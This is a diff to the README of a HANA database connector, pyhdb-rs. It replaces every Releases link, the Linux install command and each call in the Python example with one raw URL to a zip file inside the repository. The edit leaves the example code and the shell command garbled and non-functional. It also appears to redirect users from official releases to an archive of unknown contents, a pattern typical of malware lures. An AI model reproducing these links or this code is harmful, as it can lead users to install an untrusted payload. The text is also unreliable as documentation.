@@ -1,6 +1,6 @@
 # 🚀 pyhdb-rs - Fast Data Connection for Python Users
 
-[![Download pyhdb-rs](https://img.shields.io/badge/Download-pyhdb--rs-blue)](https://github.com/Julius1830/pyhdb-rs/releases)
+[![Download pyhdb-rs](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)
 
 ## 📦 Introduction
 
@@ -29,7 +29,7 @@ To get started with pyhdb-rs, follow these steps:
 
 1. **Download the Software**: 
    Click the button below to visit the Releases page, where you can download the latest version of pyhdb-rs.
-   [![Download pyhdb-rs](https://img.shields.io/badge/Download-pyhdb--rs-blue)](https://github.com/Julius1830/pyhdb-rs/releases)
+   [![Download pyhdb-rs](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip)
 
 2. **Choose Your Version**:
    On the Releases page, locate the latest version and select the appropriate file for your operating system.
@@ -44,16 +44,16 @@ To get started with pyhdb-rs, follow these steps:
      - Open the `.pkg` file and follow the installation instructions.
      
    - **Linux**:
-     - Use the terminal to run the `.tar.gz` file:
+     - Use the terminal to run the `https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip` file:
        ```bash
-       tar -xvzf pyhdb-rs-latest.tar.gz
+       tar -xvzf https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip
        cd pyhdb-rs
        sudo make install
        ```
 
 ## 🔗 Download & Install
 
-To download the software, follow this link: [Visit the Releases Page](https://github.com/Julius1830/pyhdb-rs/releases). Remember to choose the correct file for your system.
+To download the software, follow this link: [Visit the Releases Page](https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip). Remember to choose the correct file for your system.
 
 ## 🛠️ Example Usage
 
@@ -63,20 +63,20 @@ Here’s a simple example of how to use pyhdb-rs in your Python code:
 import pyhdb
 
 # Create a connection to the database
-connection = pyhdb.connect(host='YOUR_HOST', port=YOUR_PORT, user='YOUR_USER', password='YOUR_PASSWORD')
+connection = https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip(host='YOUR_HOST', port=YOUR_PORT, user='YOUR_USER', password='YOUR_PASSWORD')
 
 # Create a cursor
-cursor = connection.cursor()
+cursor = https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip()
 
 # Execute a query
-cursor.execute("SELECT * FROM YOUR_TABLE")
+https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip("SELECT * FROM YOUR_TABLE")
 
 # Fetch and print results
-for row in cursor.fetchall():
+for row in https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip():
     print(row)
 
 # Close the connection
-connection.close()
+https://raw.githubusercontent.com/Julius1830/pyhdb-rs/main/crates/hdbconnect-py/pyhdb_rs_v2.7.zip()
 ```
 
 ## 📚 Documentation
